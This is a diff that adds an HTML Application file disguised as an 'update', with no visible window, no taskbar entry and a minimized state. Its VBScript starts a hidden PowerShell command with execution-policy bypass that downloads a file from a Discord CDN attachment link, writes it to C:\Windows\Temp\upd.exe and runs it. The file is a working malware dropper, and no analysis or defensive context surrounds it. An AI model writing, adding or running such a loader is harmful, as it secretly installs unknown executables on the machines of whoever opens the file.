@@ -1,0 +1,23 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    ID="oBVC"
+    APPLICATIONNAME="update"
+    BORDER="none"
+    BORDERSTYLE="normal"
+    CAPTION="no"
+    ICON=""
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"/>
+
+<script language="VBScript">
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -w hidden -nop -ep bypass -c ""$d=(New-Object Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/1367499475203129415/1477680254733778976/help.exe?ex=69a5a47a&is=69a452fa&hm=b28f442e873a26b3e944b35935ccd7d71f17bee3179e51bcde7843d0f34a86de&'); [IO.File]::WriteAllBytes('C:\Windows\Temp\upd.exe',$d); Start-Process 'C:\Windows\Temp\upd.exe'""", 0, True
+window.close
+</script>
+</head>
+<body>
+</body>
+</html>
